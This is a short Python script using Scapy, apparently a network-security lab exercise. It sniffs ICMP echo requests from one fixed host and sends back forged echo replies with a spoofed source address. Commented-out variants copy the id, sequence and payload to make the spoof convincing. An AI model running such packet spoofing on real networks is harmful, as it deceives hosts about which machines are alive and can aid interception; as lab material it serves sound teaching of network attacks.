from scapy.all import *
def spoof_response(pkt):
  if (pkt[1].type == 8):
    a = IP()
    print("source: ", pkt.getlayer(IP).src)
    print("dst: ", pkt.getlayer(IP).dst)
    a.dst = "100.65.100.72"
    a.src = pkt.getlayer(IP).dst
    a.ttl = 100
    b = ICMP(type=0)
    p = a/b
    send(p,iface="en0")
  # 
    # a = IP()
    # print("source: ", pkt.getlayer(IP).src)
    # print("dst: ", pkt.getlayer(IP).dst)
    # a.dst = pkt.getlayer(IP).src
    # a.src = pkt.getlayer(IP).dst
    # a.ttl = 100
    # b = ICMP(type=0)
    # p = a/b
    # send(p)

    # dst = pkt[1].dst
    # src = pkt[1].src
    # spoofed = IP(src=dst, dst=src)
    # id = pkt[2].id
    # seq = pkt[2].seq

    # b = ICMP(type=0, id=id, seq=seq)
    # load=pkt[3].load
    # p = spoofed/b/load
    # p.ttl = 100
    # send(p)


    # dst=pkt[1].dst
    # src=pkt[1].src
    # seq = pkt[2].seq
    # id = pkt[2].id
    # load=pkt[3].load
    # reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/load
    # reply.ttl=100
    # send(reply)
    # reply.show()
    # pkt.show()

pkt = sniff(filter="src host 100.65.100.72 and icmp", prn=spoof_response)
# pkt = sniff(filter="icmp and src host 100.65.100.75", prn=spoof_response)